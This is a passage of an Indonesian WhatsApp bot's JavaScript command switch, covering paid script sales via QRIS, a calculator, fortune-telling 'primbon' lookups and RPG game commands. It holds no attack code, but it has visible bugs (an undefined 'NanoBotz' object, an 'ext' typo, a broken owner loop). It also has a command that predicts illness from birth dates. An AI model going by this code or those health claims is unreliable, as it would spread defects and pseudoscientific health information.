            { quoted: m }
          );
        }
        break;
      case "qris":
        {
          teks28 = `Anda Sedang Membeli Atau Ingin Mendonasikan? Silahkan Scan Qris Di Atas Ya Kak ${pushname}
`;
          Kilianhst.sendMessage(
            from,
            {
              image: { url: "https://files.catbox.moe/1b1d2q.jpg" },
              caption: teks28,
            },
            { quoted: m }
          );
        }
        break;
      case "buysc":
        {
          let qris = "-"; // Ganti dengan gambar QRIS kamu
          let caption = `*Pembelian Script HuTao - AI*\n\nSilakan Transfer Ke QRIS Di Atas Dengan Nominal 40.000\nLalu Kirim Bukti Transfer Dengan Caption *.confirm*\nSetelah Diterima, Owner Akan Mengirim Script Nya`;
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: qris }, caption },
            { quoted: m }
          );
        }
        break;

      case "confirm":
        {
          if (!m.quoted || !/image/.test(m.quoted.mtype))
            return reply(
              "Reply Foto Bukti Transfer Dengan Caption *.confirm dana/gopay/ovo*"
            );

          let metode = text.toLowerCase();
          const valid = ["dana", "gopay", "ovo"];
          if (!valid.some((v) => metode.includes(v))) {
            return reply(`Metode Tidak Valid!\nContoh: *.confirm dana*`);
          }

          let teks = `*Konfirmasi Bukti Pembelian SC*\nDari: @${
            m.sender.split`@`[0]
          }\nMetode: *${metode.toUpperCase()}*\n\nCek Foto Terlampir.`;
          let media = await m.quoted.download();
          for (let ow of owner) {
            await Kilianhst.sendMessage(`${global.owner}@s.whatsapp.net`, {
              image: media,
              caption: teks,
              mentions: [m.sender],
            });
          }
          reply(
            "Bukti Transfer Berhasil Dikirim Ke Owner.\nTunggu Hingga Di Verifikasi."
          );
        }
        break;

      case "lanjutin":
        {
          if (!isOwner) return reply(mess.owner);
          let userId =
            m.quoted?.participant ||
            m.quoted?.key?.participant ||
            m.quoted?.sender;
          if (!userId) return reply("Reply Bukti Yang Dikirim User");
          await Kilianhst.sendMessage(userId, {
            document: fs.readFileSync("./backup/script-HuTao.zip"), // Ganti path script kamu
            fileName: `Script-hutao.zip`,
            mimetype: "application/zip",
            caption:
              "Berikut Script Yang Kamu Beli.\nTerima Kasih Telah Order!",
          });
          reply("Script Berhasil Dikirim Ke User.");
        }
        break;
      case "kalkulator":
        {
          if (text.split("+")[0] && text.split("+")[1]) {
            const nilai_one = Number(text.split("+")[0]);
            const nilai_two = Number(text.split("+")[1]);
            reply(`${nilai_one + nilai_two}`);
          } else if (text.split("-")[0] && text.split("-")[1]) {
            const nilai_one = Number(text.split("-")[0]);
            const nilai_two = Number(text.split("-")[1]);
            reply(`${nilai_one - nilai_two}`);
          } else if (text.split("×")[0] && text.split("×")[1]) {
            const nilai_one = Number(text.split("×")[0]);
            const nilai_two = Number(text.split("×")[1]);
            reply(`${nilai_one * nilai_two}`);
          } else if (text.split("÷")[0] && text.split("÷")[1]) {
            const nilai_one = Number(text.split("÷")[0]);
            const nilai_two = Number(text.split("÷")[1]);
            reply(`${nilai_one / nilai_two}`);
          } else reply(`*Example* : ${prefix + command} 1 + 1`);
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗣 𝗥 𝗜 𝗠 𝗕 𝗢 𝗡  -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "nomerhoki":
      case "nomorhoki":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 6288292024190`);
          let anu = await primbon.nomer_hoki(Number(text));
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`
          );
        }
        break;
      case "artimimpi":
      case "tafsirmimpi":
        {
          if (!text) return reply(`Contoh : ${prefix + command} belanja`);
          let anu = await primbon.tafsir_mimpi(text);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`
          );
        }
        break;
      case "ramalanjodoh":
      case "ramaljodoh":
        {
          if (!text)
            return reply(
              `Contoh : ${
                prefix + command
              } Dika, 7, 7, 2005, Novia, 16, 11, 2004`
            );
          let [
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2,
          ] = text.split`,`;
          let anu = await primbon.ramalan_jodoh(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "ramalanjodohbali":
      case "ramaljodohbali":
        {
          if (!text)
            return reply(
              `Contoh : ${
                prefix + command
              } Dika, 7, 7, 2005, Novia, 16, 11, 2004`
            );
          let [
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2,
          ] = text.split`,`;
          let anu = await primbon.ramalan_jodoh_bali(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "suamiistri":
        {
          if (!text)
            return reply(
              `Contoh : ${
                prefix + command
              } Dika, 7, 7, 2005, Novia, 16, 11, 2004`
            );
          let [
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2,
          ] = text.split`,`;
          let anu = await primbon.suami_istri(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "ramalancinta":
      case "ramalcinta":
        {
          if (!text)
            return reply(
              `Contoh : ${
                prefix + command
              } Dika, 7, 7, 2005, Novia, 16, 11, 2004`
            );
          let [
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2,
          ] = text.split`,`;
          let anu = await primbon.ramalan_cinta(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "artinama":
        {
          if (!text) return reply(`Contoh : ${prefix + command} Dika Ardianta`);
          let anu = await primbon.arti_nama(text);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "kecocokannama":
      case "cocoknama":
        {
          if (!text)
            return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`);
          let [nama, tgl, bln, thn] = text.split`,`;
          let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`
          );
        }
        break;
      case "kecocokanpasangan":
      case "cocokpasangan":
      case "pasangan":
        {
          if (!text) return reply(`Contoh : ${prefix + command} Dika|Novia`);
          let [nama1, nama2] = text.split`|`;
          let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2);
          if (anu.status == false) return reply(anu.message);
          NanoBotz.sendImage(
            m.chat,
            anu.message.gambar,
            `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`
          );
        }
        break;
      case "jadianpernikahan":
      case "jadiannikah":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 6, 12, 2020`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`
          );
        }
        break;
      case "sifatusaha":
        {
          if (!ext) return reply(`Contoh : ${prefix + command} 28, 12, 2021`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`
          );
        }
        break;
      case "rejeki":
      case "rezeki":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "pekerjaan":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "ramalannasib":
      case "ramalnasib":
      case "nasib":
        {
          if (!text) return reply(`Contoh : 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.ramalan_nasib(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`
          );
        }
        break;
      case "potensipenyakit":
      case "penyakit":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "artitarot":
      case "tarot":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.arti_kartu_tarot(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          NanoBotz.sendImage(
            m.chat,
            anu.message.image,
            `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "fengshui":
        {
          if (!text)
            return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${
              prefix + command
            } Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`;
          let [nama, gender, tahun] = text.split`,`;
          let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`
          );
        }
        break;
      case "haribaik":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.petung_hari_baik(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "harisangar":
      case "taliwangke":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "harinaas":
      case "harisial":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.primbon_hari_naas(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`
          );
        }
        break;
      case "nagahari":
      case "harinaga":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.rahasia_naga_hari(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "arahrejeki":
      case "arahrezeki":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "peruntungan":
        {
          if (!text)
            return reply(
              `Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${
                prefix + command
              } Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
            );
          let [nama, tgl, bln, thn, untuk] = text.split`,`;
          let anu = await primbon.ramalan_peruntungan(
            nama,
            tgl,
            bln,
            thn,
            untuk
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "weton":
      case "wetonjawa":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.weton_jawa(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`
          );
        }
        break;
      case "sifat":
      case "karakter":
        {
          if (!text)
            return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`);
          let [nama, tgl, bln, thn] = text.split`,`;
          let anu = await primbon.sifat_karakter_tanggal_lahir(
            nama,
            tgl,
            bln,
            thn
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`
          );
        }
        break;
      case "keberuntungan":
        {
          if (!text)
            return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`);
          let [nama, tgl, bln, thn] = text.split`,`;
          let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`
          );
        }
        break;
      case "memancing":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 12, 1, 2022`);
          let [tgl, bln, thn] = text.split`,`;
          let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "masasubur":
        {
          if (!text)
            return reply(
              `Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${
                prefix + command
              } hari pertama menstruasi, siklus`
            );
          let [tgl, bln, thn, siklus] = text.split`,`;
          let anu = await primbon.masa_subur(tgl, bln, thn, siklus);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "zodiak":
      case "zodiac":
        {
          if (!text) return reply(`Contoh : ${prefix + command} 7 7 2005`);
          let zodiak = [
            ["capricorn", new Date(1970, 0, 1)],
            ["aquarius", new Date(1970, 0, 20)],
            ["pisces", new Date(1970, 1, 19)],
            ["aries", new Date(1970, 2, 21)],
            ["taurus", new Date(1970, 3, 21)],
            ["gemini", new Date(1970, 4, 21)],
            ["cancer", new Date(1970, 5, 22)],
            ["leo", new Date(1970, 6, 23)],
            ["virgo", new Date(1970, 7, 23)],
            ["libra", new Date(1970, 8, 23)],
            ["scorpio", new Date(1970, 9, 23)],
            ["sagittarius", new Date(1970, 10, 22)],
            ["capricorn", new Date(1970, 11, 22)],
          ].reverse();

          function getZodiac(month, day) {
            let d = new Date(1970, month - 1, day);
            return zodiak.find(([_, _d]) => d >= _d)[0];
          }
          let date = new Date(text);
          if (date == "Invalid Date") return date;
          let d = new Date();
          let [tahun, bulan, tanggal] = [
            d.getFullYear(),
            d.getMonth() + 1,
            d.getDate(),
          ];
          let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()];

          let zodiac = await getZodiac(birth[1], birth[2]);

          let anu = await primbon.zodiak(zodiac);
          if (anu.status == false) return reply(anu.message);
          reply(
            `• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "shio":
        {
          if (!text)
            return reply(
              `Contoh : ${
                prefix + command
              } tikus\n\nNote : For Detail https://primbon.com/shio.htm`
            );
          let anu = await primbon.shio(text);
          if (anu.status == false) return reply(anu.message);
          reply(`• *Hasil :* ${anu.message}`);
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗣𝗥𝗜𝗠𝗕𝗢𝗡 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗥 𝗣 𝗚  -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "joinrpg":
        {
          fs.readFile("./system/RPG/join.json", "utf8", (err, data) => {
            if (err) {
              console.error(err);
            }
            let users;
            try {
              users = JSON.parse(data);
            } catch (parseError) {
              console.error("Err:", parseError);
            }
            const userExists = users.some((user) => user.id === m.sender);

            if (userExists) {
              return reply("Kamu sudah Join.");
            }
            users.push({ id: m.sender });

            fs.writeFile(
              "./system/RPG/join.json",
              JSON.stringify(users, null, 2),
              "utf8",
              (err) => {
                if (err) {
                  console.error(err);
                } else {
                  return reply("Sukses Join  Rpg!");
                }
              }
            );
          });
        }
        break;

      case "myguild":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          const showMyGuild = (userId, m) => {
            const guildIdc = userGuilds[userId];
            if (!guildIdc) {
              return reply("You are not a member of any guild.");
            }

            return showGuildInfo(guildIdc, m);
          };
          showMyGuild(m.sender, m);
        }
        break;

      case "guildinfo":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!text) return reply(`[ Alicia ] >> Masukan Nama guild`);
          const guildIdd = text;
          getGuildInfo(text);
        }
        break;

      case "delguild":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!text) return reply(`[ Alicia ] >> Masukan Nama guild`);
          deleteGuild(text, m.sender);
        }
        break;

      case "joinguild":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!text) return reply("Masukan Id Guild");
          const guildId = text;
          joinGuild(guildId, m.sender);
        }
        break;

      case "createguild":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!text) return reply("Masukan Nama guild nya");
          const guildName = text;
          createGuild(guildName, m.sender);
        }
        break;

      case "listguild":
        if (!isUserRegistered(ckusrjoin))
          return reply(
            "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
          );
        listGuilds();
        break;

      case "nebang":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
              seconds = Math.floor((duration / 1000) % 60),
              minutes = Math.floor((duration / (1000 * 60)) % 60),
              hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

            hours = hours < 10 ? "0" + hours : hours;
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            return hours + " jam " + minutes + " menit " + seconds + " detik";
          }
          let user = db.data.users[m.sender];
          let time = user.lastparming + 1800000;
          if (new Date() - user.lastparming < 1800000)
            return reply(
              `Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(
                time - new Date()
              )} lagi`
            );
          let wood = `${Math.floor(Math.random() * 50)}`.trim();
          let money = `${Math.floor(Math.random() * 50000)}`.trim();
          user.wood += wood * 1;
          user.money += money * 1;
          user.lastparming = new Date() * 1;
          reply(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`);
        }
        break;

      case "casino":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let buatall = 1;
          Kilianhst.casino = Kilianhst.casino ? Kilianhst.casino : {};
          if (m.chat in Kilianhst.casino)
            return reply(
              "Masih ada yang melakukan casino disini, tunggu sampai selesai!!"
            );
          else Kilianhst.casino[m.chat] = true;
          try {
            let randomaku = `${Math.floor(Math.random() * 101)}`.trim();
            let randomkamu = `${Math.floor(Math.random() * 81)}`.trim(); //hehe Biar Susah Menang :v
            let Aku = randomaku * 1;
            let Kamu = randomkamu * 1;
            let count = args[0];
            count = count
              ? /all/i.test(count)
                ? Math.floor(db.data.users[m.sender].exp / buatall)
                : parseInt(count)
              : args[0]
              ? parseInt(args[0])
              : 1;
            count = Math.max(1, count);
            if (args.length < 1)
              return reply("casino <jumlah>\n " + "casino 1000");
            if (db.data.users[m.sender].exp >= count * 1) {
              db.data.users[m.sender].exp -= count * 1;
              //await reply('') //Kwkwwkkwlwlw
              if (Aku > Kamu) {
                reply(
                  `💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nKamu kehilangan ${count} Uang(xp)`
                );
              } else if (Aku < Kamu) {
                db.data.users[m.sender].exp += count * 2;
                reply(
                  `💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nKamu mendapatkan ${
                    count * 2
                  } Uang(xp)`
                );
              } else {
                db.data.users[m.sender].exp += count * 1;
                reply(
                  `💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*SERI*\nKamu mendapatkan ${
                    count * 1
                  } Uang(xp)`
                );
              }
            } else
              reply(
                `Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`
              );
          } catch (e) {
            console.log(e);
            reply("Error!!");
            if (DevMode) {
              for (let jid of global.owner
                .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
                .filter((v) => v != Kilianhst.user.jid)) {
                Kilianhst.sendMessage(
                  jid,
                  "casino.js error\nNo: *" +
                    m.sender.split`@`[0] +
                    "*\nCommand: *" +
                    m.text +
                    "*\n\n*" +
                    e +
                    "*",
                  MessageType.text
                );
              }
            }
          } finally {
            delete Kilianhst.casino[m.chat];
          }
        }
        break;

      case "kerja":
      case "bekerja":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let type = (args[0] || "").toLowerCase();
          let users = db.data.users[m.sender];
          let time = users.lastkerja + 30000;
          let __timers = new Date() - users.lastkerja;
          let _timers = 1000 - __timers;
          let timers = clockString(_timers);

          let penumpan = [
            "mas mas",
            "bapak bapak",
            "cewe sma",
            "bocil epep",
            "emak emak",
          ];
          let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)];

          let daganga = [
            "wortel",
            "sawi",
            "selada",
            "tomat",
            "seledri",
            "cabai",
            "daging",
            "ikan",
            "ayam",
          ];
          let dagangan = daganga[Math.floor(Math.random() * daganga.length)];

          let pasie = ["sakit kepala", "cedera", "luka bakar", "patah tulang"];
          let pasien = pasie[Math.floor(Math.random() * pasie.length)];

          let pane = [
            "Wortel",
            "Kubis",
            "stowbery",
            "teh",
            "padi",
            "jeruk",
            "pisang",
            "semangka",
            "durian",
            "rambutan",
          ];
          let panen = pane[Math.floor(Math.random() * pane.length)];

          let bengke = [
            "mobil",
            "motor",
            "becak",
            "bajai",
            "bus",
            "angkot",
